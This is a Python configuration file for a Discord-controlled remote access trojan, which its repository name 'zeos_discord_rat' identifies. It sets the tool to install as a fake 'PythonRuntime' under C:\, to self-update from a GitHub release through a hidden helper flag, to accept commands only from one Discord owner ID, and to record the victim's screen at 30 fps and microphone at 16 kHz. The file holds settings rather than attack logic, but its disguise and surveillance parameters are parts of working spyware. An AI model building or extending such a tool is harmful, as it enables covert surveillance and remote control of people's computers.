from pathlib import Path

VERSION = "1.0.0"
UPDATE_TAG = "new updater inbound"
APP_NAME = "runtime"
APP_DIR = "PythonRuntime"
# Folder the runtime is installed in. The installer uses the same path.
INSTALL_DIR = Path(r"C:\PythonRuntime")

# GitHub release the runtime is downloaded from.
GITHUB_OWNER = "TaherMustansir1929"
GITHUB_REPO = "zeos_discord_rat"
ASSET_NAME = "runtime.exe"
# Argument that turns runtime.exe into the background update helper.
UPDATE_HELPER_FLAG = "--update-helper"

# Prefix that every command of the bot uses.
COMMAND_PREFIX = "!"

# Discord account that is allowed to run the commands.
OWNER_ID = 915623041105551420

# Voice streaming needs the opus library, which Python does not ship.
OPUS_LIBRARY_NAMES = (
    "libopus-0.x64.dll",
    "libopus-0.x86.dll",
    "libopus.dll",
    "libopus.so.0",
    "libopus.so.1",
)

# Frames per second used for the screen recording.
RECORDING_FPS = 30

# Sample rate used for the microphone recording.
AUDIO_SAMPLE_RATE = 16000
